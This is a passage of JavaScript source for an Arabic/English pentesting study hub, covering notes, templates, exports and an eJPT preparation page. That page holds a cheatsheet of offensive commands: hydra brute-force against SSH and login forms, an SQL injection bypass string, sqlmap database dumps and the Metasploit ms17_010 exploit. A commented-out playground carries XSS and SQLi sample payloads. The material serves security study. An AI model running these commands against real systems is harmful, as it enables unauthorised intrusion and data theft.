  const notes = JSON.parse(localStorage.getItem('studyhub_notes') || '[]');
  const note = notes[index];
  alert(`${note.title} \n\n${note.content} `);
}

function editNote(index) {
  const notes = JSON.parse(localStorage.getItem('studyhub_notes') || '[]');
  const note = notes[index];
  const newContent = prompt(txt('تعديل المحتوى:', 'Edit content:'), note.content);
  if (newContent !== null) {
    notes[index].content = newContent;
    localStorage.setItem('studyhub_notes', JSON.stringify(notes));
    loadPage('notes');
  }
}

function filterNotes() {
  const search = document.getElementById('notes-search').value.toLowerCase();
  document.querySelectorAll('.note-card').forEach(card => {
    const title = card.querySelector('.note-title').textContent.toLowerCase();
    const content = card.querySelector('.note-content').textContent.toLowerCase();
    card.style.display = (title.includes(search) || content.includes(search)) ? 'block' : 'none';
  });
}

function createFromTemplate(type) {
  const templates = {
    vulnerability: { title: 'ثغرة جديدة - ', content: '## الوصف\n\n## الخطورة\n\n## خطوات الإنتاج\n\n## التأثير\n\n## الإصلاح' },
    tool: { title: 'أداة - ', content: '## الاسم\n\n## الوظيفة\n\n## طريقة الاستخدام\n\n## أمثلة' },
    technique: { title: 'تقنية - ', content: '## الوصف\n\n## متى تستخدم\n\n## الخطوات\n\n## ملاحظات' },
    ctf: { title: 'CTF Writeup - ', content: '## التحدي\n\n## الصعوبة\n\n## الحل\n\n## Flag' }
  };

  const template = templates[type];
  showAddNoteModal();
  setTimeout(() => {
    document.getElementById('new-note-title').value = template.title;
    document.getElementById('new-note-content').value = template.content;
    document.getElementById('new-note-category').value = type === 'ctf' ? 'technique' : type;
  }, 300);
}

function exportAllNotesAsJSON() {
  const notes = JSON.parse(localStorage.getItem('studyhub_notes') || '[]');
  if (notes.length === 0) { alert(txt('لا توجد ملاحظات', 'No notes')); return; }
  const blob = new Blob([JSON.stringify(notes, null, 2)], { type: 'application/json' });
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = 'studyhub-notes.json';
  a.click();
}

// ========== Bookmarks Helper Functions ==========
function getBookmarkIcon(pageId) {
  const icons = {
    'courses': 'fa-graduation-cap', 'rooms': 'fa-door-open', 'toolshub': 'fa-toolbox',
    'bugbounty': 'fa-bug', 'ctf': 'fa-flag', 'notes': 'fa-sticky-note',
    'dashboard': 'fa-chart-line', 'settings': 'fa-gear', 'home': 'fa-home'
  };
  return icons[pageId] || 'fa-bookmark';
}

function getBookmarkIconClass(pageId) {
  const classes = { 'courses': 'courses', 'rooms': 'rooms', 'toolshub': 'tools' };
  return classes[pageId] || 'default';
}

/* ========== التصديرات ========== */
function exportPDF(area) {
  const elem = area === 'notes' ? document.getElementById('quick-notes') : document.querySelector('main');
  html2pdf().set({ margin: 10, filename: area + '.pdf' }).from(elem).save();
}

function exportMarkdown() {
  const md = document.getElementById('report-md')
    ? document.getElementById('report-md').value
    : document.getElementById('quick-notes').value;
  const blob = new Blob([md], { type: 'text/markdown' });
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = 'report.md';
  a.click();
}

function download12WeekPlan() {
  const plan = `# خطة 12 أسبوع – Web Pentesting(BreachLabs)
الأسبوع 1: أساسيات TCP / IP + TLS
الأسبوع 2: Recon(amass, subfinder, crt.sh)
...
  (يمكن تعديله لاحقًا)
  `;
  const blob = new Blob([plan], { type: 'text/markdown' });
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = '12-week-plan.md';
  a.click();
}

function buildStarterZip() {
  const zip = new JSZip();
  zip.file('README.md', `# خطة 12 أسبوع – Web Pentesting(Study Hub)
مرحباً بك في خطة الـ 12 أسبوع لتعلم Web Pentesting و Bug Bounty.

## الهيكل العام
    - الأسبوع 1 - 2: أساسيات الشبكات + Recon
      - الأسبوع 3 - 4: Scanning & Enumeration
        - الأسبوع 5 - 7: OWASP Top - 10(نظرية + مختبرات)
          - الأسبوع 8 - 9: Exploitation & Chaining
            - الأسبوع 10: Post - Exploitation & Reporting
              - الأسبوع 11 - 12: برامج المكافآت والتقديم

ابدأ بالصفحة الرئيسية وتابع الخطوات!

  ملاحظة: استخدم الأدوات فقط على النطاقات المصرح بها.
`);
  zip.file('12-week-plan.md', `# خطة 12 أسبوع – Web Pentesting
الأسبوع 1: أساسيات TCP / IP + TLS
الأسبوع 2: Recon(amass, subfinder, crt.sh)
الأسبوع 3: Scanning(nmap, gobuster)
الأسبوع 4: Enumeration
الأسبوع 5 - 7: OWASP Top - 10
الأسبوع 8 - 9: Exploitation
الأسبوع 10: Post - Exploitation
الأسبوع 11 - 12: Bug Bounty Programs

يمكن تعديلها حسب احتياجاتك.`);
  zip.folder('recon').file('.gitkeep', '');
  zip.folder('scan').file('.gitkeep', '');
  zip.folder('exploits').file('.gitkeep', '');
  zip.folder('reports').file('template.md', `# تقرير ثغرة
## العنوان
## الوصف
## الخطوات
## الإصلاح
    `);
  zip.generateAsync({ type: 'blob' }).then(blob => {
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = 'study-hub-starter.zip';
    a.click();
  });
}

/* ========== NEW CERT PRACTICE PAGES & PLAYGROUND ========== */
/* ========== NEW CERT PRACTICE PAGES & PLAYGROUND ========== */
function pageEjpt() {
  var ejptProgress = JSON.parse(localStorage.getItem('ejpt_progress') || '{}');

  var topics = [
    { id: 'info-gathering', title: 'Information Gathering', icon: 'fa-magnifying-glass' },
    { id: 'scanning', title: 'Footprinting & Scanning', icon: 'fa-radar' },
    { id: 'enumeration', title: 'Enumeration', icon: 'fa-list-check' },
    { id: 'vuln-assessment', title: 'Vulnerability Assessment', icon: 'fa-bug' },
    { id: 'windows-audit', title: 'Auditing Windows', icon: 'fa-windows' },
    { id: 'linux-audit', title: 'Auditing Linux', icon: 'fa-linux' },
    { id: 'exploitation', title: 'System Exploitation', icon: 'fa-bomb' },
    { id: 'post-exploit', title: 'Post-Exploitation', icon: 'fa-flag' },
    { id: 'pivoting', title: 'Pivoting & Lateral Movement', icon: 'fa-route' },
    { id: 'sqli', title: 'SQL Injection', icon: 'fa-database' },
    { id: 'xss', title: 'Cross-Site Scripting', icon: 'fa-code' },
    { id: 'auth-attacks', title: 'Authentication Attacks', icon: 'fa-key' }
  ];

  var completedCount = topics.filter(function (t) { return ejptProgress[t.id]; }).length;
  var progressPercent = Math.round((completedCount / topics.length) * 100);

  function buildTopic(id, iconPrefix, colorClass) {
    var topic = topics.find(function (t) { return t.id === id; });
    var completedClass = ejptProgress[id] ? 'completed' : '';
    var checkedAttr = ejptProgress[id] ? 'checked' : '';
    return '<label class="topic-item ' + completedClass + '">' +
      '<input type="checkbox" class="form-check-input" ' + checkedAttr + ' onchange="updateEjptProgress(\'' + id + '\', this.checked)">' +
      '<i class="' + iconPrefix + ' ' + topic.icon + ' ' + colorClass + '"></i>' +
      '<span>' + topic.title + '</span>' +
      '</label>';
  }

  var assessmentHtml = ['info-gathering', 'scanning', 'enumeration', 'vuln-assessment']
    .map(function (id) { return buildTopic(id, 'fa-solid', 'text-primary'); }).join('');
  var auditHtml = ['windows-audit', 'linux-audit']
    .map(function (id) { return buildTopic(id, 'fa-brands', 'text-success'); }).join('');
  var pentestHtml = ['exploitation', 'post-exploit', 'pivoting']
    .map(function (id) { return buildTopic(id, 'fa-solid', 'text-danger'); }).join('');
  var webSecHtml = ['sqli', 'xss', 'auth-attacks']
    .map(function (id) { return buildTopic(id, 'fa-solid', 'text-warning'); }).join('');

  return '<div class="container-fluid p-0">' +
    '<style>' +
    '.ejpt-hero { background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%); color: white; padding: 60px 0; margin-bottom: 30px; }' +
    '.ejpt-badge { background: linear-gradient(135deg, #e74c3c, #c0392b); padding: 6px 20px; border-radius: 50px; font-size: 0.8rem; display: inline-block; margin-bottom: 15px; }' +
    '.domain-card { background: var(--bg-card, white); border: none; border-radius: 16px; box-shadow: 0 8px 30px rgba(0,0,0,0.08); transition: all 0.3s ease; height: 100%; position: relative; overflow: hidden; }' +
    '.domain-card:hover { transform: translateY(-5px); box-shadow: 0 15px 40px rgba(0,0,0,0.12); }' +
    '.domain-card::before { content: ""; position: absolute; top: 0; left: 0; right: 0; height: 4px; }' +
    '.domain-card.blue::before { background: linear-gradient(90deg, #3498db, #2980b9); }' +
    '.domain-card.green::before { background: linear-gradient(90deg, #27ae60, #229954); }' +
    '.domain-card.red::before { background: linear-gradient(90deg, #e74c3c, #c0392b); }' +
    '.domain-card.orange::before { background: linear-gradient(90deg, #f39c12, #e67e22); }' +
    '.topic-item { padding: 10px 14px; margin: 6px 0; background: var(--bg-secondary, #f8f9fa); border-radius: 10px; display: flex; align-items: center; gap: 10px; cursor: pointer; transition: all 0.2s ease; }' +
    '.topic-item:hover { background: var(--bg-hover, #e9ecef); transform: translateX(4px); }' +
    '.topic-item.completed { background: rgba(39, 174, 96, 0.1); border-left: 3px solid #27ae60; }' +
    '.cheatsheet-card { background: #1e272e; border-radius: 12px; overflow: hidden; }' +
    '.cheatsheet-header { background: linear-gradient(135deg, #2c3e50, #34495e); padding: 12px 16px; display: flex; align-items: center; gap: 8px; }' +
    '.cheatsheet-body { padding: 16px; font-family: monospace; font-size: 0.85rem; color: #a5b1c2; line-height: 1.7; }' +
    '.cheatsheet-body code { color: #7bed9f; }' +
    '.lab-card { background: var(--bg-card, white); border-radius: 16px; padding: 24px; text-align: center; transition: all 0.3s ease; border: 2px solid transparent; }' +
    '.lab-card:hover { border-color: var(--primary-color, #3498db); }' +
    '.lab-icon { width: 60px; height: 60px; border-radius: 16px; display: flex; align-items: center; justify-content: center; font-size: 1.5rem; margin: 0 auto 15px; }' +
    '.resource-item { display: flex; align-items: center; gap: 16px; padding: 16px; background: var(--bg-card, white); border-radius: 12px; margin-bottom: 12px; transition: all 0.3s ease; text-decoration: none; color: inherit; }' +
    '.resource-item:hover { transform: translateX(8px); box-shadow: 0 8px 25px rgba(0,0,0,0.1); }' +
    '.section-title { font-size: 1.5rem; font-weight: 700; margin-bottom: 24px; display: flex; align-items: center; gap: 12px; }' +
    '.section-title i { width: 40px; height: 40px; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 1rem; }' +
    '</style>' +

    '<div class="ejpt-hero">' +
    '<div class="container text-center">' +
    '<div class="ejpt-badge"><i class="fa-solid fa-certificate me-2"></i>INE Certification</div>' +
    '<h1 class="display-4 fw-bold mb-3"><i class="fa-solid fa-shield-halved me-3"></i>eJPTv2 Master Guide</h1>' +
    '<p class="lead mb-4 opacity-75">' + txt('الدليل الشامل للتحضير لشهادة eJPT', 'Complete eJPT preparation guide') + '</p>' +
    '<div class="row justify-content-center mt-4">' +
    '<div class="col-md-5 col-lg-3">' +
    '<div class="bg-white bg-opacity-10 rounded-pill p-3">' +
    '<div class="d-flex justify-content-between align-items-center mb-2 px-2">' +
    '<span class="small">' + txt('تقدمك', 'Progress') + '</span>' +
    '<span class="fw-bold">' + completedCount + '/' + topics.length + '</span>' +
    '</div>' +
    '<div class="progress" style="height: 10px; background: rgba(255,255,255,0.2);">' +
    '<div class="progress-bar bg-success" style="width: ' + progressPercent + '%;"></div>' +
    '</div>' +
    '</div>' +
    '</div>' +
    '</div>' +
    '</div>' +
    '</div>' +

    '<div class="container pb-5">' +
    '<div class="section-title"><i class="bg-primary text-white"><i class="fa-solid fa-book-open"></i></i>' + txt('المنهج الدراسي', 'Curriculum') + '</div>' +
    '<div class="row g-4 mb-5">' +
    '<div class="col-lg-6"><div class="domain-card card p-4 blue"><h5 class="fw-bold mb-3"><i class="fa-solid fa-clipboard-list text-primary me-2"></i>' + txt('منهجيات التقييم', 'Assessment Methodologies') + '</h5>' + assessmentHtml + '</div></div>' +
    '<div class="col-lg-6"><div class="domain-card card p-4 green"><h5 class="fw-bold mb-3"><i class="fa-solid fa-server text-success me-2"></i>' + txt('تدقيق الأنظمة', 'Host & Network Auditing') + '</h5>' + auditHtml + '</div></div>' +
    '<div class="col-lg-6"><div class="domain-card card p-4 red"><h5 class="fw-bold mb-3"><i class="fa-solid fa-crosshairs text-danger me-2"></i>' + txt('اختبار الاختراق', 'Penetration Testing') + '</h5>' + pentestHtml + '</div></div>' +
    '<div class="col-lg-6"><div class="domain-card card p-4 orange"><h5 class="fw-bold mb-3"><i class="fa-solid fa-globe text-warning me-2"></i>' + txt('أمن تطبيقات الويب', 'Web App Security') + '</h5>' + webSecHtml + '</div></div>' +
    '</div>' +

    '<div class="section-title"><i class="bg-dark text-white"><i class="fa-solid fa-terminal"></i></i>' + txt('أوراق الغش', 'Cheatsheets') + '</div>' +
    '<div class="row g-4 mb-5">' +
    '<div class="col-md-6"><div class="cheatsheet-card"><div class="cheatsheet-header"><i class="fa-solid fa-radar text-info"></i><span class="text-white fw-bold">Nmap</span></div><div class="cheatsheet-body"><code>nmap -sC -sV -oA scan TARGET</code><br><code>nmap -p- -T4 TARGET</code><br><code>nmap --script=vuln TARGET</code></div></div></div>' +
    '<div class="col-md-6"><div class="cheatsheet-card"><div class="cheatsheet-header"><i class="fa-solid fa-key text-warning"></i><span class="text-white fw-bold">Hydra</span></div><div class="cheatsheet-body"><code>hydra -l user -P pass.txt ssh://TARGET</code><br><code>hydra TARGET http-post-form "/login:u=^USER^&p=^PASS^:F=failed"</code></div></div></div>' +
    '<div class="col-md-6"><div class="cheatsheet-card"><div class="cheatsheet-header"><i class="fa-solid fa-database text-primary"></i><span class="text-white fw-bold">SQLi</span></div><div class="cheatsheet-body"><code>\' OR \'1\'=\'1\' --</code><br><code>sqlmap -u "URL?id=1" --dbs</code><br><code>sqlmap -u "URL" --dump</code></div></div></div>' +
    '<div class="col-md-6"><div class="cheatsheet-card"><div class="cheatsheet-header"><i class="fa-brands fa-linux text-success"></i><span class="text-white fw-bold">Metasploit</span></div><div class="cheatsheet-body"><code>msfconsole</code><br><code>search type:exploit platform:windows</code><br><code>use exploit/windows/smb/ms17_010</code></div></div></div>' +
    '</div>' +

    '<div class="section-title"><i class="bg-info text-white"><i class="fa-solid fa-flask"></i></i>' + txt('المختبرات', 'Labs') + '</div>' +
    '<div class="row g-4 mb-5">' +
    '<div class="col-md-4"><div class="lab-card shadow-sm"><div class="lab-icon bg-primary bg-opacity-10 text-primary"><i class="fa-solid fa-database"></i></div><h6 class="fw-bold">SQL Injection</h6><button class="btn btn-primary w-100" onclick="loadCTFRoom(\'sql-injection-basics\')"><i class="fa-solid fa-play me-2"></i>Start</button></div></div>' +
    '<div class="col-md-4"><div class="lab-card shadow-sm"><div class="lab-icon bg-danger bg-opacity-10 text-danger"><i class="fa-solid fa-code"></i></div><h6 class="fw-bold">XSS</h6><button class="btn btn-danger w-100" onclick="loadCTFRoom(\'xss-reflected\')"><i class="fa-solid fa-play me-2"></i>Start</button></div></div>' +
    '<div class="col-md-4"><div class="lab-card shadow-sm"><div class="lab-icon bg-warning bg-opacity-10 text-warning"><i class="fa-solid fa-key"></i></div><h6 class="fw-bold">Brute Force</h6><button class="btn btn-warning w-100" onclick="loadCTFRoom(\'auth-weak-password\')"><i class="fa-solid fa-play me-2"></i>Start</button></div></div>' +
    '</div>' +

    '<div class="section-title"><i class="bg-secondary text-white"><i class="fa-solid fa-link"></i></i>' + txt('المراجع', 'Resources') + '</div>' +
    '<a href="https://ine.com/learning/paths/ejptv2-junior-penetration-tester" target="_blank" class="resource-item shadow-sm"><div class="bg-primary bg-opacity-10 rounded-circle p-3"><i class="fa-solid fa-graduation-cap fa-2x text-primary"></i></div><div class="flex-grow-1"><h6 class="mb-0 fw-bold">Official INE Course</h6></div><i class="fa-solid fa-arrow-right text-muted"></i></a>' +
    '<a href="https://tryhackme.com/path/outline/jrpenetrationtester" target="_blank" class="resource-item shadow-sm"><div class="bg-danger bg-opacity-10 rounded-circle p-3"><i class="fa-solid fa-fire fa-2x text-danger"></i></div><div class="flex-grow-1"><h6 class="mb-0 fw-bold">TryHackMe Jr. Pentester</h6></div><i class="fa-solid fa-arrow-right text-muted"></i></a>' +
    '<a href="https://github.com/grumpz/ejpt" target="_blank" class="resource-item shadow-sm"><div class="bg-dark bg-opacity-10 rounded-circle p-3"><i class="fa-brands fa-github fa-2x text-dark"></i></div><div class="flex-grow-1"><h6 class="mb-0 fw-bold">eJPT Notes & Cheatsheets</h6></div><i class="fa-solid fa-arrow-right text-muted"></i></a>' +
    '</div>' +
    '</div>';
}

// Helper to update eJPT progress
window.updateEjptProgress = function (topicId, isChecked) {
  const ejptProgress = JSON.parse(localStorage.getItem('ejpt_progress') || '{}');
  if (isChecked) {
    ejptProgress[topicId] = true;
  } else {
    delete ejptProgress[topicId];
  }
  localStorage.setItem('ejpt_progress', JSON.stringify(ejptProgress));

  // Refresh page to update progress bar (simple approach)
  // In a real app we'd update DOM directly, but this ensures consistency
  loadPage('ejpt');
};

/* SECTION REMOVED BY USER REQUEST
function pagePlayground() {
  const tools = [
    // Web Security
    { id: 'xss-sim', name: 'XSS Simulator', icon: 'fa-code', color: 'warning', category: 'web' },
    { id: 'sql-sim', name: 'SQL Injection', icon: 'fa-database', color: 'danger', category: 'web' },
    { id: 'csrf-generator', name: 'CSRF Generator', icon: 'fa-shield-halved', color: 'warning', category: 'web' },
    { id: 'cmd-injection', name: 'Command Injection', icon: 'fa-terminal', color: 'dark', category: 'web' },
    { id: 'idor-sim', name: 'IDOR Simulator', icon: 'fa-users', color: 'primary', category: 'web' },
    { id: 'logic-flaw', name: 'Logic Flaw Shop', icon: 'fa-cart-shopping', color: 'success', category: 'web' },

    // Encoding/Decoding
    { id: 'jwt-decoder', name: 'JWT Decoder', icon: 'fa-key', color: 'success', category: 'encoding' },
    { id: 'base64-tool', name: 'Base64 Tool', icon: 'fa-font', color: 'info', category: 'encoding' },
    { id: 'hash-gen', name: 'Hash Generator', icon: 'fa-hashtag', color: 'secondary', category: 'encoding' },
    { id: 'url-encoder', name: 'URL Encoder', icon: 'fa-link', color: 'danger', category: 'encoding' },

    // Network Testing
    { id: 'cors-tester', name: 'CORS Tester', icon: 'fa-globe', color: 'primary', category: 'network' },
    { id: 'http-client', name: 'HTTP Client', icon: 'fa-paper-plane', color: 'success', category: 'network' },
    { id: 'headers-analyzer', name: 'Headers Analyzer', icon: 'fa-server', color: 'info', category: 'network' },
    { id: 'ws-client', name: 'WebSocket Client', icon: 'fa-network-wired', color: 'info', category: 'network' },

    // Advanced
    { id: 'storage-inspector', name: 'Storage Inspector', icon: 'fa-hard-drive', color: 'secondary', category: 'advanced' }
  ];

  const categories = {
    web: { name: txt('أمن الويب', 'Web Security'), icon: 'fa-shield-virus', color: 'danger' },
    encoding: { name: txt('التشفير والترميز', 'Encoding/Decoding'), icon: 'fa-lock', color: 'success' },
    network: { name: txt('اختبار الشبكات', 'Network Testing'), icon: 'fa-network-wired', color: 'primary' },
    advanced: { name: txt('أدوات متقدمة', 'Advanced Tools'), icon: 'fa-cogs', color: 'secondary' }
  };

  return `
    < div class="container-fluid mt-4" >
      <style>
        .playground-hero {
          background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
          color: white;
          padding: 60px 20px;
          border-radius: 20px;
          margin-bottom: 40px;
          position: relative;
          overflow: hidden;
        }
        .playground-hero::before {
          content: '';
          position: absolute;
          top: -50%;
          right: -50%;
          width: 200%;
          height: 200%;
          background: radial-gradient(circle, rgba(255,255,255,0.05) 0%, transparent 70%);
          animation: rotate 20s linear infinite;
        }
        @keyframes rotate {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
        .tool-category {
          margin-bottom: 40px;
        }
        .category-header {
          display: flex;
          align-items: center;
          gap: 15px;
          margin-bottom: 20px;
          padding-bottom: 10px;
          border-bottom: 2px solid #f0f0f0;
        }
        .category-icon {
          width: 45px;
          height: 45px;
          border-radius: 10px;
          display: flex;
          align-items: center;
          justify-content: center;
          font-size: 1.3rem;
        }
        .tool-btn {
          transition: all 0.3s ease;
          border-left: 3px solid transparent;
        }
        .tool-btn:hover {
          border-left-color: var(--bs-primary);
          background-color: rgba(var(--bs-primary-rgb), 0.1) !important;
        }
        .tool-btn.active {
          border-left-color: var(--bs-primary);
          background-color: rgba(var(--bs-primary-rgb), 0.15) !important;
        }
        .search-tool {
          position: relative;
        }
        .search-tool input {
          padding-left: 40px;
        }
        .search-tool i {
          position: absolute;
          left: 15px;
          top: 50%;
          transform: translateY(-50%);
          color: #999;
        }
      </style>

      <!--Hero Section-- >
      <div class="playground-hero text-center">
        <div class="container" style="position: relative; z-index: 1;">
          <h1 class="display-4 fw-bold mb-3">
            <i class="fa-solid fa-flask-vial me-3"></i>
            ${txt('ساحة التجربة الأمنية', 'Security Playground')}
          </h1>
          <p class="lead mb-4" style="opacity: 0.95;">
            ${txt('أدوات تفاعلية لاختبار وتحليل الثغرات الأمنية في بيئة آمنة', 'Interactive tools for testing and analyzing security vulnerabilities in a safe environment')}
          </p>
          <div class="d-flex justify-content-center gap-4 flex-wrap">
            <div class="text-center">
              <h3 class="fw-bold">${tools.length}</h3>
              <small style="opacity: 0.8;">${txt('أداة متاحة', 'Available Tools')}</small>
            </div>
            <div class="text-center">
              <h3 class="fw-bold">4</h3>
              <small style="opacity: 0.8;">${txt('فئات', 'Categories')}</small>
            </div>
            <div class="text-center">
              <h3 class="fw-bold">100%</h3>
              <small style="opacity: 0.8;">${txt('آمن', 'Safe')}</small>
            </div>
          </div>
        </div>
      </div>

      <div class="container">
        <div class="row">
          <!-- Sidebar -->
          <div class="col-md-3">
            <div class="card shadow-sm sticky-top" style="top: 20px; max-height: calc(100vh - 100px); overflow-y: auto;">
              <div class="card-header bg-primary text-white">
                <h6 class="mb-0">
                  <i class="fa-solid fa-list me-2"></i>
                  ${txt('الأدوات', 'Tools')}
                </h6>
              </div>
              
              <!-- Search -->
              <div class="card-body pb-2">
                <div class="search-tool mb-3">
                  <i class="fa-solid fa-search"></i>
                  <input 
                    type="text" 
                    class="form-control" 
                    id="tool-search" 
                    placeholder="${txt('بحث...', 'Search...')}"
                    onkeyup="filterTools(this.value)"
                  />
                </div>
              </div>

              <!-- Tools List by Category -->
              <div class="list-group list-group-flush" id="tools-list">
                ${Object.entries(categories).map(([catKey, catInfo]) => `
                  <div class="tool-category-section" data-category="${catKey}">
                    <div class="list-group-item bg-light">
                      <small class="fw-bold text-${catInfo.color}">
                        <i class="fa-solid ${catInfo.icon} me-1"></i>
                        ${catInfo.name}
                      </small>
                    </div>
                    ${tools.filter(t => t.category === catKey).map((tool, idx) => `
                      <button 
                        class="list-group-item list-group-item-action tool-btn ${idx === 0 && catKey === 'web' ? 'active' : ''}" 
                        data-bs-toggle="tab" 
                        data-bs-target="#${tool.id}"
                        data-tool-name="${tool.name.toLowerCase()}"
                      >
                        <i class="fa-solid ${tool.icon} text-${tool.color} me-2"></i>
                        ${tool.name}
                      </button>
                    `).join('')}
                  </div>
                `).join('')}
              </div>
            </div>
          </div>
          
          <!-- Main Content -->
          <div class="col-md-9">
            <div class="tab-content">
        <!-- XSS Simulator -->
        <div class="tab-pane fade show active" id="xss-sim">
          <div class="card shadow-sm">
            <div class="card-header bg-warning text-dark">
              <h5 class="mb-0"><i class="fa-solid fa-code"></i> XSS Simulator</h5>
            </div>
            <div class="card-body">
              <div class="alert alert-info">
                <i class="fa-solid fa-info-circle"></i> ${txt('اختبر payloads الـ XSS في بيئة آمنة', 'Test XSS payloads in a safe environment')}
              </div>
              <label class="form-label fw-bold">${txt('أدخل Payload', 'Enter Payload')}</label>
              <textarea id="xss-input" class="form-control mb-3" rows="3" placeholder="<script>alert('XSS')</script>"></textarea>
              <button class="btn btn-warning" onclick="testXSS()">
                <i class="fa-solid fa-play"></i> ${txt('تنفيذ', 'Execute')}
              </button>
              <button class="btn btn-outline-secondary" onclick="document.getElementById('xss-input').value=''; document.getElementById('xss-output').innerHTML=''">
                <i class="fa-solid fa-eraser"></i> ${txt('مسح', 'Clear')}
              </button>
              <div class="mt-3">
                <label class="form-label fw-bold">${txt('النتيجة', 'Output')}</label>
                <div id="xss-output" class="border rounded p-3 bg-light" style="min-height: 100px;"></div>
              </div>
            </div>
          </div>
        </div>

        <!-- SQL Injection -->
        <div class="tab-pane fade" id="sql-sim">
          <div class="card shadow-sm">
            <div class="card-header bg-danger text-white">
              <h5 class="mb-0"><i class="fa-solid fa-database"></i> SQL Injection Simulator</h5>
            </div>
            <div class="card-body">
              <div class="alert alert-warning">
                <i class="fa-solid fa-exclamation-triangle"></i> ${txt('اختبر SQL injection payloads على نموذج تسجيل دخول وهمي', 'Test SQL injection payloads on a mock login form')}
              </div>
              <label class="form-label fw-bold">${txt('اسم المستخدم', 'Username')}</label>
              <input id="sql-username" class="form-control mb-3" placeholder="admin' OR '1'='1" value="admin">
              <label class="form-label fw-bold">${txt('كلمة المرور', 'Password')}</label>
              <input id="sql-password" class="form-control mb-3" type="password" placeholder="password" value="password">
              <button class="btn btn-danger" onclick="simulateSQL()">
                <i class="fa-solid fa-sign-in-alt"></i> ${txt('تسجيل الدخول', 'Login')}
              </button>
              <div class="mt-3">
                <label class="form-label fw-bold">${txt('استعلام SQL', 'SQL Query')}</label>
                <pre id="sql-query" class="bg-dark text-light p-3 rounded"></pre>
                <label class="form-label fw-bold">${txt('النتيجة', 'Result')}</label>
                <div id="sql-result" class="alert" role="alert"></div>
              </div>
            </div>
          </div>
        </div>

        <!-- JWT Decoder -->
        <div class="tab-pane fade" id="jwt-decoder">
          <div class="card shadow-sm">
            <div class="card-header bg-success text-white">
              <h5 class="mb-0"><i class="fa-solid fa-key"></i> JWT Decoder</h5>
            </div>
            <div class="card-body">
              <label class="form-label fw-bold">${txt('أدخل JWT Token', 'Enter JWT Token')}</label>
              <textarea id="jwt-input" class="form-control mb-3" rows="4" placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."></textarea>
              <button class="btn btn-success" onclick="decodeJWT()">
                <i class="fa-solid fa-unlock"></i> ${txt('فك التشفير', 'Decode')}
              </button>
              <div class="mt-3">
                <label class="form-label fw-bold">${txt('Header', 'Header')}</label>
                <pre id="jwt-header" class="bg-light p-3 rounded border"></pre>
                <label class="form-label fw-bold">${txt('Payload', 'Payload')}</label>
                <pre id="jwt-payload" class="bg-light p-3 rounded border"></pre>
                <label class="form-label fw-bold">${txt('Signature', 'Signature')}</label>
                <pre id="jwt-signature" class="bg-light p-3 rounded border"></pre>
              </div>
              
              <hr>
              <h6 class="fw-bold"><i class="fa-solid fa-check-double"></i> ${txt('التحقق من التوقيع', 'Signature Verification')}</h6>
              
              <ul class="nav nav-tabs mb-3" id="jwtVerifyTabs" role="tablist">
                <li class="nav-item" role="presentation">
                  <button class="nav-link active" id="hs256-tab" data-bs-toggle="tab" data-bs-target="#hs256" type="button" role="tab">HS256 (Secret)</button>
                </li>
                <li class="nav-item" role="presentation">
                  <button class="nav-link" id="rs256-tab" data-bs-toggle="tab" data-bs-target="#rs256" type="button" role="tab">RS256 (Public Key)</button>
                </li>
              </ul>
              
              <div class="tab-content">
                <div class="tab-pane fade show active" id="hs256" role="tabpanel">
                  <label class="form-label">${txt('Token', 'Token')}</label>
                  <input id="jwtv-token" class="form-control mb-2" placeholder="eyJ...">
                  <label class="form-label">${txt('Secret Key', 'Secret Key')}</label>
                  <input id="jwtv-secret" class="form-control mb-2" placeholder="secret">
                  <button class="btn btn-primary btn-sm" onclick="jwtVerifyHS()">${txt('تحقق', 'Verify')}</button>
                </div>
                <div class="tab-pane fade" id="rs256" role="tabpanel">
                  <label class="form-label">${txt('Public Key (PEM)', 'Public Key (PEM)')}</label>
                  <textarea id="jwtv-public" class="form-control mb-2" rows="3" placeholder="-----BEGIN PUBLIC KEY..."></textarea>
                  <button class="btn btn-primary btn-sm" onclick="jwtVerifyRS()">${txt('تحقق', 'Verify')}</button>
                </div>
              </div>
              <div id="jwtv-result" class="mt-3 fw-bold"></div>
            </div>
          </div>
        </div>

        <!-- Base64 Tool -->
        <div class="tab-pane fade" id="base64-tool">
          <div class="card shadow-sm">
            <div class="card-header bg-info text-white">
              <h5 class="mb-0"><i class="fa-solid fa-font"></i> Base64 Encoder/Decoder</h5>
            </div>
            <div class="card-body">
              <label class="form-label fw-bold">${txt('النص', 'Text')}</label>
              <textarea id="base64-input" class="form-control mb-3" rows="3" placeholder="Enter text..."></textarea>
              <div class="btn-group mb-3" role="group">
                <button class="btn btn-info" onclick="base64Encode()">
                  <i class="fa-solid fa-lock"></i> ${txt('تشفير', 'Encode')}
                </button>
                <button class="btn btn-outline-info" onclick="base64Decode()">
                  <i class="fa-solid fa-unlock"></i> ${txt('فك التشفير', 'Decode')}
                </button>
              </div>
              <label class="form-label fw-bold">${txt('النتيجة', 'Result')}</label>
              <textarea id="base64-output" class="form-control" rows="3" readonly></textarea>
            </div>
          </div>
        </div>

        <!-- Hash Generator -->
        <div class="tab-pane fade" id="hash-gen">
          <div class="card shadow-sm">
            <div class="card-header bg-secondary text-white">
              <h5 class="mb-0"><i class="fa-solid fa-hashtag"></i> Hash Generator</h5>
            </div>
            <div class="card-body">
              <label class="form-label fw-bold">${txt('النص', 'Text')}</label>
              <input id="hash-input" class="form-control mb-3" placeholder="Text to hash">
              <div class="btn-group mb-3" role="group">
                <button class="btn btn-secondary" onclick="generateHash('SHA-1')">SHA-1</button>
                <button class="btn btn-secondary" onclick="generateHash('SHA-256')">SHA-256</button>
                <button class="btn btn-secondary" onclick="generateHash('SHA-512')">SHA-512</button>
              </div>
              <label class="form-label fw-bold">${txt('Hash', 'Hash')}</label>
              <pre id="hash-output" class="bg-light p-3 rounded border"></pre>
            </div>
          </div>
        </div>

        <!-- CORS Tester -->
        <div class="tab-pane fade" id="cors-tester">
          <div class="card shadow-sm">
            <div class="card-header bg-primary text-white">
              <h5 class="mb-0"><i class="fa-solid fa-globe"></i> CORS Tester</h5>
            </div>
            <div class="card-body">
